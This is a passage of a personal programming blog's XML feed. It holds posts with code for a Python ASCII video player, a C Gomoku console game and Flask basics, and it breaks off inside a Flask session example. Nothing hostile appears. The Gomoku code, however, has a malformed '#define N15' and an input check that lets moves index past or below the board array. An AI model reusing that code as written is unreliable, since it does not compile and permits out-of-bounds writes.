&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;</span></span><br><span class="line">            ch = sys.stdin.read(<span class="number">1</span>)</span><br><span class="line">            breakflag = <span class="keyword">True</span> <span class="keyword">if</span> ch <span class="keyword">else</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># &#x521B;&#x5EFA;&#x7EBF;&#x7A0B;</span></span><br><span class="line">        getchar = threading.Thread(target=getChar)</span><br><span class="line">        <span class="comment"># &#x8BBE;&#x7F6E;&#x4E3A;&#x5B88;&#x62A4;&#x7EBF;&#x7A0B;</span></span><br><span class="line">        getchar.daemon = <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># &#x542F;&#x52A8;&#x5B88;&#x62A4;&#x7EBF;&#x7A0B;</span></span><br><span class="line">        getchar.start()</span><br><span class="line">        <span class="comment"># &#x8F93;&#x51FA;&#x7684;&#x5B57;&#x7B26;&#x753B;&#x884C;&#x6570;</span></span><br><span class="line">        rows = len(self.charVideo[<span class="number">0</span>])//os.get_terminal_size()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> frame <span class="keyword">in</span> self.charVideo:</span><br><span class="line">            <span class="comment"># &#x63A5;&#x6536;&#x5230;&#x8F93;&#x5165;&#x5219;&#x9000;&#x51FA;&#x5FAA;&#x73AF;</span></span><br><span class="line">            <span class="keyword">if</span> breakflag <span class="keyword">is</span> <span class="keyword">True</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            self.streamOut(frame)</span><br><span class="line">            self.streamFlush()</span><br><span class="line">            time.sleep(self.timeInterval)</span><br><span class="line">            <span class="comment"># &#x5171; rows &#x884C;&#xFF0C;&#x5149;&#x6807;&#x4E0A;&#x79FB; rows-1 &#x884C;&#x56DE;&#x5230;&#x5F00;&#x59CB;&#x5904;</span></span><br><span class="line">            self.streamOut(<span class="string">&apos;\033[{}A\r&apos;</span>.format(rows<span class="number">-1</span>))</span><br><span class="line">        <span class="comment"># &#x6062;&#x590D;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x4E3A;&#x539F;&#x6765;&#x7684;&#x5C5E;&#x6027;</span></span><br><span class="line">        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)</span><br><span class="line">        <span class="comment"># &#x5149;&#x6807;&#x4E0B;&#x79FB; rows-1 &#x884C;&#x5230;&#x6700;&#x540E;&#x4E00;&#x884C;&#xFF0C;&#x6E05;&#x7A7A;&#x6700;&#x540E;&#x4E00;&#x884C;</span></span><br><span class="line">        self.streamOut(<span class="string">&apos;\033[{}B\033[K&apos;</span>.format(rows<span class="number">-1</span>))</span><br><span class="line">        <span class="comment"># &#x6E05;&#x7A7A;&#x6700;&#x540E;&#x4E00;&#x5E27;&#x7684;&#x6240;&#x6709;&#x884C;&#xFF08;&#x4ECE;&#x5012;&#x6570;&#x7B2C;&#x4E8C;&#x884C;&#x8D77;&#xFF09;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(rows<span class="number">-1</span>):</span><br><span class="line">            <span class="comment"># &#x5149;&#x6807;&#x4E0A;&#x79FB;&#x4E00;&#x884C;</span></span><br><span class="line">            self.streamOut(<span class="string">&apos;\033[1A&apos;</span>)</span><br><span class="line">            <span class="comment"># &#x6E05;&#x7A7A;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C;</span></span><br><span class="line">            self.streamOut(<span class="string">&apos;\r\033[K&apos;</span>)</span><br><span class="line">        info = <span class="string">&apos;User interrupt!\n&apos;</span> <span class="keyword">if</span> breakflag <span class="keyword">else</span> <span class="string">&apos;Finished!\n&apos;</span></span><br><span class="line">        self.streamOut(info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line">    <span class="comment"># &#x8BBE;&#x7F6E;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&apos;file&apos;</span>,</span><br><span class="line">                        help=<span class="string">&apos;Video file or charvideo file&apos;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&apos;-e&apos;</span>, <span class="string">&apos;--export&apos;</span>, nargs = <span class="string">&apos;?&apos;</span>, const = <span class="string">&apos;charvideo.txt&apos;</span>,</span><br><span class="line">                        help=<span class="string">&apos;Export charvideo file&apos;</span>)</span><br><span class="line">    <span class="comment"># &#x83B7;&#x53D6;&#x53C2;&#x6570;</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    v2char = V2Char(args.file)</span><br><span class="line">    <span class="keyword">if</span> args.export:</span><br><span class="line">        v2char.export(args.export)</span><br><span class="line">    v2char.play()</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C language quickly realizes Gomoku</title>
      <link href="/2018/10/07/C-language-quickly-realizes-Gomoku/"/>
      <url>/2018/10/07/C-language-quickly-realizes-Gomoku/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1525830964659.png" alt=""></p><a id="more"></a><p>Code:<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#x68CB;&#x5B50; &#x25CF; &#x25CB;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> chessboard[N + <span class="number">1</span>][N + <span class="number">1</span>] = { <span class="number">0</span> };</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x7528;&#x6765;&#x8BB0;&#x5F55;&#x8F6E;&#x5230;&#x73A9;&#x5BB6;1&#x8FD8;&#x662F;&#x73A9;&#x5BB6;2</span></span><br><span class="line"><span class="keyword">int</span> whoseTurn = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initGame</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printChessboard</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">playChess</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//&#x521D;&#x59CB;&#x5316;&#x6E38;&#x620F;</span></span><br><span class="line">initGame();</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="comment">//&#x6BCF;&#x6B21;&#x5FAA;&#x73AF;&#x81EA;&#x589E;1&#xFF0C;&#x5B9E;&#x73B0;&#x73A9;&#x5BB6;&#x8F6E;&#x6D41;&#x4E0B;&#x5B50;</span></span><br><span class="line">whoseTurn++;</span><br><span class="line">playChess();</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initGame</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;input Y to enter the game:&quot;</span>);</span><br><span class="line">c = getchar();</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&apos;y&apos;</span> != c &amp;&amp; <span class="string">&apos;Y&apos;</span> != c)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">printChessboard();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printChessboard</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= N; i++)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= N; j++)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, j);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, i);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> == chessboard[i][j])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  X&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">2</span> == chessboard[i][j])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  O&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  *&quot;</span>);</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">playChess</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i, j, winner;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> == whoseTurn % <span class="number">2</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Turn to player 1, please input the position:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;i, &amp;j);</span><br><span class="line"><span class="comment">//&#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x4F4D;&#x7F6E;&#x8D85;&#x51FA;&#x68CB;&#x76D8;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x5219;&#x91CD;&#x65B0;&#x8F93;&#x5165;&#x3002;</span></span><br><span class="line"><span class="keyword">if</span> (i &gt; N+<span class="number">1</span> || j &gt; N+<span class="number">1</span>) {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your position beynod the chessboard range, please input the proper position:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;i, &amp;j);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(chessboard[i][j] != <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your position is taken,choose another:&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;i, &amp;j);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">chessboard[i][j] = <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Turn to player 2, please input the position:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;i, &amp;j);</span><br><span class="line"><span class="comment">//&#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x4F4D;&#x7F6E;&#x8D85;&#x51FA;&#x68CB;&#x76D8;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x5219;&#x91CD;&#x65B0;&#x8F93;&#x5165;&#x3002;</span></span><br><span class="line"><span class="keyword">if</span> (i &gt; N+<span class="number">1</span> || j &gt; N+<span class="number">1</span>) {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your position beynod the chessboard range, please input the proper position:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;i, &amp;j);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span>(chessboard[i][j] != <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your position is taken,choose another:&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;i, &amp;j);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">chessboard[i][j] = <span class="number">2</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line"></span><br><span class="line">printChessboard();</span><br><span class="line"><span class="keyword">if</span> (judge(i, j))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> == whoseTurn % <span class="number">2</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;player1 win!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;player2 win!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">2</span> - whoseTurn % <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> step[<span class="number">4</span>][<span class="number">2</span>]={{<span class="number">-1</span>,<span class="number">0</span>},{<span class="number">0</span>,<span class="number">-1</span>},{<span class="number">1</span>,<span class="number">1</span>},{<span class="number">-1</span>,<span class="number">1</span>}};<span class="comment">// BUG</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> d[<span class="number">2</span>]={<span class="number">-1</span>,<span class="number">1</span>};</span><br><span class="line">        <span class="keyword">int</span> count=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">4</span>;++k){<span class="comment">// suppose x = 5, y = 5</span></span><br><span class="line">                <span class="keyword">int</span> row=x+k*d[j]*step[i][<span class="number">0</span>];<span class="comment">// row: </span></span><br><span class="line">                <span class="keyword">int</span> col=y+k*d[j]*step[i][<span class="number">1</span>];<span class="comment">// col: </span></span><br><span class="line">                <span class="keyword">if</span>(row&gt;=<span class="number">1</span>&amp;&amp;row&lt;=N&amp;&amp;col&gt;=<span class="number">1</span>&amp;&amp;col&lt;=N&amp;&amp;chessboard[x][y]==chessboard[row][col])</span><br><span class="line">                    count+=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        <span class="keyword">if</span>(count&gt;=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-07%2016-21-54.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> c </category>
          
          <category> game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> game </tag>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python3 builds a personal blog based on the Flask framework</title>
      <link href="/2018/10/06/Python3-builds-a-personal-blog-based-on-the-Flask-framework/"/>
      <url>/2018/10/06/Python3-builds-a-personal-blog-based-on-the-Flask-framework/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1520922144052.png" alt=""></p><a id="more"></a><p><a href="http://p4wiqzx0i.bkt.clouddn.com/blog.zip" target="_blank" rel="noopener">&#x5B8C;&#x6574;&#x4EE3;&#x7801;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python Flask web framework</title>
      <link href="/2018/10/05/Python-Flask-web-framework/"/>
      <url>/2018/10/05/Python-Flask-web-framework/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/ncn29.jpg" alt=""></p><a id="more"></a><h3 id="&#x8DEF;&#x7531;"><a href="#&#x8DEF;&#x7531;" class="headerlink" title="&#x8DEF;&#x7531;"></a>&#x8DEF;&#x7531;</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&apos;/user/&lt;username&gt;&apos;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_user_profile</span><span class="params">(username)</span>:</span></span><br><span class="line">    <span class="comment"># &#x663E;&#x793A;&#x7528;&#x6237;&#x7684;&#x540D;&#x79F0;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&apos;User %s&apos;</span> % username</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&apos;/post/&lt;int:post_id&gt;&apos;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_post</span><span class="params">(post_id)</span>:</span></span><br><span class="line">    <span class="comment"># &#x663E;&#x793A;&#x63D0;&#x4EA4;&#x6574;&#x578B;&#x7684;&#x7528;&#x6237;&quot;id&quot;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6CE8;&#x610F;&quot;int&quot;&#x662F;&#x5C06;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5F62;&#x5F0F;&#x8F6C;&#x6362;&#x4E3A;&#x6574;&#x578B;&#x6570;&#x636E;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&apos;Post %d&apos;</span> % post_id</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x9759;&#x6001;&#x6587;&#x4EF6;&#x53CA;&#x6E32;&#x67D3;&#x6A21;&#x7248;"><a href="#&#x9759;&#x6001;&#x6587;&#x4EF6;&#x53CA;&#x6E32;&#x67D3;&#x6A21;&#x7248;" class="headerlink" title="&#x9759;&#x6001;&#x6587;&#x4EF6;&#x53CA;&#x6E32;&#x67D3;&#x6A21;&#x7248;"></a>&#x9759;&#x6001;&#x6587;&#x4EF6;&#x53CA;&#x6E32;&#x67D3;&#x6A21;&#x7248;</h3><p>hello.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&apos;/hello/&apos;)</span></span><br><span class="line"><span class="meta">@app.route(&apos;/hello/&lt;name&gt;&apos;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name=None)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&apos;hello.html&apos;</span>, name=name)</span><br></pre></td></tr></tbody></table></figure><p></p><p>hello.html<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;title&gt;Hello from Flask&lt;/title&gt;</span><br><span class="line">{% <span class="keyword">if</span> name %}</span><br><span class="line">  &lt;h1&gt;Hello {{ name }}!&lt;/h1&gt;</span><br><span class="line">{% <span class="keyword">else</span> %}</span><br><span class="line">  &lt;h1&gt;Hello World!&lt;/h1&gt;</span><br><span class="line">{% endif %}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x91CD;&#x5B9A;&#x5411;"><a href="#&#x91CD;&#x5B9A;&#x5411;" class="headerlink" title="&#x91CD;&#x5B9A;&#x5411;"></a>&#x91CD;&#x5B9A;&#x5411;</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort, redirect, url_for</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&apos;/&apos;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&apos;login&apos;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&apos;/login&apos;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    abort(<span class="number">401</span>)</span><br><span class="line">    this_is_never_executed()</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x5B9A;&#x5236;&#x9519;&#x8BEF;&#x9875;&#x9762;&#xFF1A;"><a href="#&#x5B9A;&#x5236;&#x9519;&#x8BEF;&#x9875;&#x9762;&#xFF1A;" class="headerlink" title="&#x5B9A;&#x5236;&#x9519;&#x8BEF;&#x9875;&#x9762;&#xFF1A;"></a>&#x5B9A;&#x5236;&#x9519;&#x8BEF;&#x9875;&#x9762;&#xFF1A;</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&apos;page_not_found.html&apos;</span>), <span class="number">404</span></span><br></pre></td></tr></tbody></table></figure><h3 id="&#x56DE;&#x8BDD;&#xFF1A;"><a href="#&#x56DE;&#x8BDD;&#xFF1A;" class="headerlink" title="&#x56DE;&#x8BDD;&#xFF1A;"></a>&#x56DE;&#x8BDD;&#xFF1A;</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&apos;/&apos;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&apos;username&apos;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&apos;Logged in as %s&apos;</span> % escape(session[<span class="string">&apos;username&apos;</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&apos;You are not logged 